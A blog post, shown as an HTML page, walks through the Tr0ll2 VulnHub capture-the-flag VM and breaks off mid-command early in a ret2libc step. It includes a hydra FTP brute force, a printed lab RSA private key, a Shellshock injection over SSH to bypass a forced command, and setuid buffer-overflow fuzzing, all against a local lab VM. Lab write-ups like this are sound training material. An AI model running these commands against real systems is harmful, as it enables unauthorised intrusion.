<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  
  <script type="application/ld+json">
{
    "@context" : "http://schema.org",
    "@type" : "BlogPosting",
    "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https:\/\/leonjza.github.io"
    },
    "articleSection" : "post",
    "name" : "another troll tamed solving troll 2",
    "headline" : "another troll tamed solving troll 2",
    "description" : "\u003ch2 id=\u0022foreword\u0022\u003eforeword\u003c\/h2\u003e\n\u003cp\u003e\u003ca href=\u0022https:\/\/www.vulnhub.com\/entry\/tr0ll-2,107\/\u0022\u003eTr0ll2\u003c\/a\u003e is a successor in a boot2root series by \u003ca href=\u0022https:\/\/twitter.com\/Maleus21\u0022\u003e@Maleus21\u003c\/a\u003e hosted over at \u003ca href=\u0022http:\/\/vulnhub.com\/\u0022\u003eVulnHub\u003c\/a\u003e. Having been able to \u003ca href=\u0022https:\/\/leonjza.github.io\/blog\/2014\/08\/15\/taming-the-troll\/\u0022\u003epwn Tr0ll1\u003c\/a\u003e, I gave this one a shot too.\u003c\/p\u003e\n\u003cp\u003eHere is my experience taming the troll, again.\u003c\/p\u003e",
    "inLanguage" : "en-US",
    "author" : "Leon Jacobs",
    "creator" : "Leon Jacobs",
    "publisher": "Leon Jacobs",
    "accountablePerson" : "Leon Jacobs",
    "copyrightHolder" : "Leon Jacobs",
    "copyrightYear" : "2014",
    "datePublished": "2014-10-10 17:32:35 \u002b0000 UTC",
    "dateModified" : "2014-10-10 17:32:35 \u002b0000 UTC",
    "url" : "https:\/\/leonjza.github.io\/blog\/2014\/10\/10\/another-troll-tamed-solving-troll-2\/",
    "wordCount" : "3319",
    "keywords" : [ "CTF","Vulnerable VM","Solution","Challenge","VulnHub","Blog" ]
}
</script>


  <title>another troll tamed solving troll 2 &middot; </title>

  
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
  <link href="https://leonjza.github.io/favicon.png" rel="icon">

  
  
  
  

  <meta name="description" content="">
  <meta name="keywords" content="">
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-44457032-2', 'auto');
    ga('send', 'pageview');
  </script>
  
</head>
<body class="theme-base-0d">
<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      
      <h1></h1>
      <p class="lead">#!/slash/note<br>
<em>A checkbox unchecker&rsquo;s notepad</em></p>
    </div>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Blog</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/post">Posts</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About Me</a></li>
      
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item">
      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
      
      
      
      
      
      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
      
      
      </li>
    </ul>

    

    <p>Copyright &copy; 2020 <a href="https://leonjza.github.io/license/">License</a><br/>
       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>

  </div>
</div>


<div class="content container">
  <div class="post">
    <h1 class="post-title">another troll tamed solving troll 2</h1>
    <span class="post-date">Oct 10, 2014 &middot; 16 minute read &middot; <a href="https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/#disqus_thread">Comments</a>
    
    <br/>
    <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
    </span>
    <h2 id="foreword">foreword</h2>
<p><a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>
<p>Here is my experience taming the troll, again.</p>
<h2 id="getting-started">getting started</h2>
<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101

Starting Nmap 6.46 <span style="color:#f92672">(</span> http://nmap.org <span style="color:#f92672">)</span> at 2014-10-10 06:55 SAST
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.56.101
Host is up, received reset <span style="color:#f92672">(</span>0.00031s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">997</span> filtered ports
Reason: <span style="color:#ae81ff">997</span> no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp open  http    syn-ack Apache httpd 2.2.22 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.21 seconds
</code></pre></div><p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>
<h2 id="web-server">web server</h2>
<p>Opening up a browser to http://192.168.56.101 revealed a familiar image:</p>
<p><figure>
    <img src="https://leonjza.github.io/images/troll2_web.png"/> 
</figure>

Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>
<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/keep_trying
/dont_bother
/noob
/ok_this_is_it
</code></pre></div><p>The content served up at these URLs:</p>
<figure>
    <img src="https://leonjza.github.io/images/troll2_noob.png"/> 
</figure>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>
<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# <span style="color:#66d9ef">for</span> line in <span style="color:#66d9ef">$(</span>cat 200.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;==&gt;</span>$line<span style="color:#e6db74">&lt;==&#34;</span> <span style="color:#f92672">&amp;&amp;</span> wget 192.168.56.101/$line/cat_the_troll.jpg; <span style="color:#66d9ef">done</span>

<span style="color:#f92672">==</span>&gt;/ok_this_is_it&lt;<span style="color:#f92672">==</span>
--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
Length: <span style="color:#ae81ff">15831</span> <span style="color:#f92672">(</span>15K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>image/jpeg<span style="color:#f92672">]</span>
Saving to: <span style="color:#e6db74">`</span>cat_the_troll.jpg.3<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">100%[=======&gt;] 15,831      --.-K/s   in 0s
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39;</span> saved <span style="color:#f92672">[</span>15831/15831<span style="color:#f92672">]</span>
</code></pre></div><p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ls -l
total <span style="color:#ae81ff">68</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">47</span> Oct <span style="color:#ae81ff">10</span> 07:31 200.txt
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15831</span> Oct  <span style="color:#ae81ff">4</span> 10:57 cat_the_troll.jpg
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15873</span> Oct  <span style="color:#ae81ff">4</span> 10:31 cat_the_troll.jpg.1 <span style="color:#75715e">#&lt;---</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15831</span> Oct  <span style="color:#ae81ff">4</span> 10:57 cat_the_troll.jpg.2
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15831</span> Oct  <span style="color:#ae81ff">4</span> 10:57 cat_the_troll.jpg.3
</code></pre></div><p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
</code></pre></div><p>Sweet, so lets print the last line of both and check what the diff is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2/c# tail -n <span style="color:#ae81ff">1</span> cat_the_troll.jpg
8�z2��p�T�lj<span style="color:#ae81ff">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%<span style="color:#f92672">=</span>���.�B���o�ES_�

root@kali:~/Desktop/troll2/c# tail -n <span style="color:#ae81ff">1</span> cat_the_troll.jpg.1
8�z2��p�T�lj<span style="color:#ae81ff">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%<span style="color:#f92672">=</span>���.�B���o�ES_��Look Deep within y0ur_self <span style="color:#66d9ef">for</span> the answer
</code></pre></div><p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>
<figure>
    <img src="https://leonjza.github.io/images/troll2_y0ur_self.png"/> 
</figure>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# head answer.txt
QQo<span style="color:#f92672">=</span>
QQo<span style="color:#f92672">=</span>
QUEK
QUIK
QUJNCg<span style="color:#f92672">==</span>
QUMK
QUNUSAo<span style="color:#f92672">=</span>
QUkK
QUlEUwo<span style="color:#f92672">=</span>
QU0K
</code></pre></div><p>Looks a lot like base64 hey? Lets try decode it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
</code></pre></div><p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>
<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>
<p>My guess was that this has to be a password for either the FTP or SSH service.</p>
<h2 id="ftpee">ftpee</h2>
<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>
<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>
<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr &quot;\&quot;' &quot; '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>
<p>And finally, it was time to let hydra on the loose.</p>
<pre><code>root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;&gt;&quot; - 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;404&quot; - 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;again&quot; - 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 - login &quot;&gt;&quot; - pass &quot;agent&quot; - 4 of 13689 [child 3]
[...]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;Tr0ll&quot; - 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;tr0ll2&quot; - 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 - login &quot;Tr0ll&quot; - pass &quot;tr0ll_again.jpg&quot; - 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08
</code></pre><p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
<span style="color:#ae81ff">220</span> Welcome to Tr0ll FTP... Only noobs stay <span style="color:#66d9ef">for</span> a <span style="color:#66d9ef">while</span>...
Name <span style="color:#f92672">(</span>192.168.56.101:root<span style="color:#f92672">)</span>: Tr0ll
<span style="color:#ae81ff">331</span> Please specify the password.
Password:
<span style="color:#ae81ff">230</span> Login successful.
</code></pre></div><p>Yay! Progress! Lets take a closer look&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; pas
Passive mode on.

ftp&gt; ls
<span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>192,168,56,101,73,4<span style="color:#f92672">)</span>
<span style="color:#ae81ff">150</span> Here comes the directory listing.
-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">1474</span> Oct <span style="color:#ae81ff">04</span> 01:09 lmao.zip
<span style="color:#ae81ff">226</span> Directory send OK.

ftp&gt; get lmao.zip
local: lmao.zip remote: lmao.zip
<span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>192,168,56,101,105,73<span style="color:#f92672">)</span>
<span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> lmao.zip <span style="color:#f92672">(</span><span style="color:#ae81ff">1474</span> bytes<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">226</span> Transfer complete.
<span style="color:#ae81ff">1474</span> bytes received in 0.00 secs <span style="color:#f92672">(</span>621.0 kB/s<span style="color:#f92672">)</span>

ftp&gt; bye
<span style="color:#ae81ff">221</span> Goodbye.
</code></pre></div><h2 id="noob-key">noob key</h2>
<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>
<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
<span style="color:#f92672">[</span>lmao.zip<span style="color:#f92672">]</span> noob password: <span style="color:#75715e">#ItCantReallyBeThisEasyRightLOL</span>
  inflating: noob

root@kali:~# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g<span style="color:#f92672">==</span>
-----END RSA PRIVATE KEY-----
</code></pre></div><p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/troll2# chmod <span style="color:#ae81ff">600</span> noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
</code></pre></div><h2 id="shocking-isnt-it">shocking isn&rsquo;t it</h2>
<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>
<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>
<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh noob@192.168.56.101 -i noob -t <span style="color:#e6db74">&#39;() { :;}; /bin/bash&#39;</span>
noob@Tr0ll2:~$ id
uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>noob<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>noob<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>noob<span style="color:#f92672">)</span>
</code></pre></div><p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command=&quot;echo TRY HARDER LOL!&quot; </code> before the public key.</p>
<h2 id="which-door-leads-to-r00t">which door leads to r00t</h2>
<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>
<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>
<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2
    <span style="color:#f92672">(</span>/dev/pts/0<span style="color:#f92672">)</span> at 0:48 ...

The system is going down <span style="color:#66d9ef">for</span> reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
</code></pre></div><p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>
<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S <span style="color:#ae81ff">1</span> door3/r00t
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
<span style="color:#ae81ff">0001214</span> __libc_start_main
<span style="color:#ae81ff">0001236</span> GLIBC_2.0
<span style="color:#ae81ff">0001320</span> R
<span style="color:#ae81ff">0001453</span> Q
<span style="color:#ae81ff">0001521</span> %
<span style="color:#ae81ff">0001526</span> h
<span style="color:#ae81ff">0001626</span> h
<span style="color:#ae81ff">0001646</span> h<span style="color:#f92672">(</span>
<span style="color:#ae81ff">0002066</span> t&amp;
<span style="color:#ae81ff">0002073</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>
<span style="color:#ae81ff">0002305</span> i
<span style="color:#ae81ff">0002620</span> Good job, stand by, executing root shell...
<span style="color:#ae81ff">0002674</span> BUHAHAHA NOOB!
<span style="color:#ae81ff">0002713</span> /sbin/reboot
<span style="color:#ae81ff">0002733</span> ;<span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">0002750</span> L
<span style="color:#ae81ff">0002760</span> p
<span style="color:#ae81ff">0003025</span> zR
<span style="color:#ae81ff">0003044</span>
<span style="color:#ae81ff">0003060</span> p
<span style="color:#ae81ff">0003077</span> x
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>
<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>
<h2 id="bof-bof-bof-your-boat">bof bof bof your boat&hellip;</h2>
<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>
<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>
<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
</code></pre></div><p>No security? EZ PEZE.</p>
<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ ./r00t <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34; * 500&#39;</span><span style="color:#66d9ef">)</span>
Segmentation fault
</code></pre></div><p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0xb7fff000<span style="color:#f92672">)</span>
    libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7e4e000<span style="color:#f92672">)</span>
    /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0x80000000<span style="color:#f92672">)</span>

noob@Tr0ll2:/tmp$ ldd ./r00t
